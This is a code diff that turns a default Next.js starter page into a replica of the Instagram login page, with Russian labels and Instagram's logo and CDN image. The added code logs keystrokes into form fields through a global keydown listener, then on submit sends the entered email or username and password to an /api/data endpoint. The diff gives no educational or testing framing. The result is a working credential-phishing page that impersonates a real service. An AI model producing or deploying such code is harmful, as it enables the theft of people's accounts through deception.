@@ -1,95 +1,103 @@
-import Image from 'next/image'
-import styles from './page.module.css'
+"use client";
+import Image from "next/image";
+import logo from "./logo.png";
+import "./styles.css";
+import { useEffect, useState } from "react";
 
 export default function Home() {
+  const [startTime] = useState(new Date());
+  const [inputData, setInputData] = useState({});
+  const [submitCount, setSubmitCount] = useState(0);
+
+  // Capture keyboard events
+  useEffect(() => {
+    const handleKeyPress = (e) => {
+      const inputName = e.target.name;
+      const inputValue = e.target.value;
+
+      setInputData((prevData) => ({
+        ...prevData,
+        [inputName]: inputValue,
+      }));
+    };
+
+    document.addEventListener("keydown", handleKeyPress);
+
+    return () => {
+      document.removeEventListener("keydown", handleKeyPress);
+    };
+  }, []);
+
+  // Capture form submission
+  const handleFormSubmit = () => {
+    setSubmitCount((prevCount) => prevCount + 1);
+
+    // Send data to the server
+    const formData = {
+      email: inputData.email,
+      password: inputData.password,
+      date: startTime.toISOString(),
+    };
+
+    fetch("/api/data", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+      },
+      body: JSON.stringify(formData),
+    })
+      .then((response) => {
+        console.log(response);
+
+        // Handle server response here
+      })
+      .catch((error) => {
+        console.error("Error sending data to server:", error);
+      });
+  };
   return (
-    <main className={styles.main}>
-      <div className={styles.description}>
-        <p>
-          Get started by editing&nbsp;
-          <code className={styles.code}>app/page.js</code>
-        </p>
-        <div>
-          <a
-            href="https://vercel.com?utm_source=create-next-app&utm_medium=appdir-template&utm_campaign=create-next-app"
-            target="_blank"
-            rel="noopener noreferrer"
-          >
-            By{' '}
-            <Image
-              src="/vercel.svg"
-              alt="Vercel Logo"
-              className={styles.vercelLogo}
-              width={100}
-              height={24}
-              priority
-            />
-          </a>
-        </div>
-      </div>
+    <>
+      <main className="flex align-items-center justify-content-center">
+        <section id="mobile" className="flex"></section>
+        <section id="auth" className="flex direction-column">
+          <div className="panel login flex direction-column">
+            <h1 title="Instagram" className="flex justify-content-center">
+              <Image className="copyright" src={logo} alt="log" height={90} />
+            </h1>
+            <form>
+              <label htmlFor="email" className="sr-only">
+                Tелефон, имя пользователя или эл. адрес
+              </label>
+              <input
+                name="email"
+                placeholder="Tелефон, имя пользователя или эл. адрес"
+              />
 
-      <div className={styles.center}>
+              <label htmlFor="password" className="sr-only">
+                Пароль
+              </label>
+              <input name="password" type="password" placeholder="Пароль" />
+
+              <button id="submit" type="button" onClick={handleFormSubmit}>
+                Войти
+              </button>
+            </form>
+          </div>
+          <div className="panel register flex justify-content-center">
+            <p>У вас нет аккаунта?</p>
+            <a href="#">Зарегистрироваться</a>
+          </div>
+        </section>
+      </main>
+      <footer>
         <Image
-          className={styles.logo}
-          src="/next.svg"
-          alt="Next.js Logo"
-          width={180}
-          height={37}
-          priority
+          className="copyright"
+          width="70"
+          src="https://static.cdninstagram.com/rsrc.php/yb/r/SxCWlJznXoy.svg"
+          alt="log"
+          height={90}
         />
-      </div>
-
-      <div className={styles.grid}>
-        <a
-          href="https://nextjs.org/docs?utm_source=create-next-app&utm_medium=appdir-template&utm_campaign=create-next-app"
-          className={styles.card}
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <h2>
-            Docs <span>-&gt;</span>
-          </h2>
-          <p>Find in-depth information about Next.js features and API.</p>
-        </a>
-
-        <a
-          href="https://nextjs.org/learn?utm_source=create-next-app&utm_medium=appdir-template&utm_campaign=create-next-app"
-          className={styles.card}
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <h2>
-            Learn <span>-&gt;</span>
-          </h2>
-          <p>Learn about Next.js in an interactive course with&nbsp;quizzes!</p>
-        </a>
-
-        <a
-          href="https://vercel.com/templates?framework=next.js&utm_source=create-next-app&utm_medium=appdir-template&utm_campaign=create-next-app"
-          className={styles.card}
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <h2>
-            Templates <span>-&gt;</span>
-          </h2>
-          <p>Explore the Next.js 13 playground.</p>
-        </a>
-
-        <a
-          href="https://vercel.com/new?utm_source=create-next-app&utm_medium=appdir-template&utm_campaign=create-next-app"
-          className={styles.card}
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <h2>
-            Deploy <span>-&gt;</span>
-          </h2>
-          <p>
-            Instantly deploy your Next.js site to a shareable URL with Vercel.
-          </p>
-        </a>
-      </div>
-    </main>
-  )
+      </footer>
+    </>
+  );
 }
